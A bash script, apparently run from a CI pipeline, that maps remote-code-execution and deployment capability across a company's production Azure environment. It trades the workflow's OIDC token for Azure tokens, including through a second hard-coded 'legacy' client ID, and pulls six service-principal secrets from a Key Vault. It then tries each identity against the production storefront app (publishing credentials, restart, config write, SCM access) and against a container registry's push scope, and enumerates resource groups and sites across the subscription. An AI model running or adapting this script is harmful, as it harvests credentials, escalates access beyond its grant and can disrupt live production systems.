#!/usr/bin/env bash
# Deploy/RCE capability matrix across all principals + find other RGs/apps + resolve 7a85156a.
set +e
SUB="$AZURE_SUBSCRIPTION_ID"; TEN="$AZURE_TENANT_ID"; RG="rg-tbl-platform-prod-sea"; APP="app-tbl-storefront-prod"
ACR="crtblplatprodx3euoz"; AUD="api://AzureADTokenExchange"
mint(){ curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value; }
oidc(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$AZURE_CLIENT_ID" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=$1" | jq -r .access_token; }
spk(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=$1" -d grant_type=client_credentials -d "client_secret=$2" --data-urlencode "scope=$3" | jq -r .access_token; }
la(){ curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer -d "client_assertion=$(mint)" --data-urlencode "scope=$1" | jq -r .access_token; }
jwtacc(){ python3 -c "import sys,base64,json;p=sys.argv[1].split('.')[1];p+='='*(-len(p)%4);d=json.loads(base64.urlsafe_b64decode(p));print(','.join(a.get('actions',[])[0:5] and [x for ac in d.get('access',[]) for x in ac.get('actions',[])]))" "$1" 2>/dev/null; }
KVP=$(oidc "https://vault.azure.net/.default"); getsec(){ curl -s -H "Authorization: Bearer $KVP" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/$1?api-version=7.4" | jq -r .value; }

echo "### other RGs + subscription-wide sites/storage (via OIDC)"
MG=$(oidc https://management.azure.com/.default)
curl -s -H "Authorization: Bearer $MG" "https://management.azure.com/subscriptions/$SUB/resourcegroups?api-version=2021-04-01" | jq -r '.value[]?.name, (.error.code//empty)'
echo "sites sub-wide: $(curl -s -H "Authorization: Bearer $MG" "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Web/sites?api-version=2023-12-01" | jq -r '.value[]?.name, (.error.code//empty)' | tr '\n' ' ')"
echo "### resolve 7a85156a via graph (directory-audit)"
DA=$(getsec directory-audit-principal); GT=$(spk "$(echo "$DA"|jq -r .appId)" "$(echo "$DA"|jq -r .clientSecret)" "https://graph.microsoft.com/.default")
curl -s -H "Authorization: Bearer $GT" "https://graph.microsoft.com/v1.0/servicePrincipals(appId='7a85156a-01c4-4e61-8472-40a92107159b')" | jq -c '{displayName,servicePrincipalType,accountEnabled,alternativeNames,appOwnerOrganizationId, error:.error.code}'

declare -a P=("OIDC|_o_|_" "legacy|_l_|_")
for s in sync-service-principal secrets-sync-principal cost-reader-principal directory-audit-principal reporting-service-principal reporting-viewer-principal; do
  S=$(getsec "$s"); P+=("$s|$(echo "$S"|jq -r .appId)|$(echo "$S"|jq -r .clientSecret)"); done
tok(){ case "$2" in _o_) oidc "$3";; _l_) la "$3";; *) spk "$2" "$3" "$4";; esac; }

echo "### DEPLOY CAPABILITY MATRIX"
for e in "${P[@]}"; do IFS='|' read -r N A K <<<"$e"
  T=$(tok "$N" "$A" "$K" "https://management.azure.com/.default"); [ ${#T} -lt 50 ] && { echo "[$N] no tok"; continue; }
  PUB=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $T" -H 'Content-Length: 0' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/publishingcredentials/list?api-version=2023-12-01")
  RST=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $T" -H 'Content-Length: 0' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/restart?api-version=2023-12-01")
  PATCHC=$(curl -s -o /dev/null -w '%{http_code}' -X PUT -H "Authorization: Bearer $T" -H 'Content-Type: application/json' "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/$APP/config/web?api-version=2023-12-01" -d '{"properties":{}}')
  AAD_SCM=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $T" "https://$APP.scm.azurewebsites.net/api/settings")
  # ACR push scope
  RT=$(curl -s -X POST "https://$ACR.azurecr.io/oauth2/exchange" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=access_token&service=$ACR.azurecr.io&tenant=$TEN&access_token=$T" | jq -r .refresh_token)
  ACRT=$(curl -s -X POST "https://$ACR.azurecr.io/oauth2/token" -H "Content-Type: application/x-www-form-urlencoded" -d "grant_type=refresh_token&service=$ACR.azurecr.io&scope=repository:tebamoto-reporting-api:pull,push&refresh_token=$RT" | jq -r '.access_token//empty')
  ACRACT=$(python3 -c "import sys,base64,json;p='$ACRT'.split('.')[1];p+='='*(-len(p)%4);print([a.get('actions') for a in json.loads(base64.urlsafe_b64decode(p)).get('access',[])])" 2>/dev/null)
  echo "[$N] publishcreds=$PUB restart=$RST configW=$PATCHC scmAAD=$AAD_SCM acrScope=$ACRACT"
done
echo "=== DONE ==="
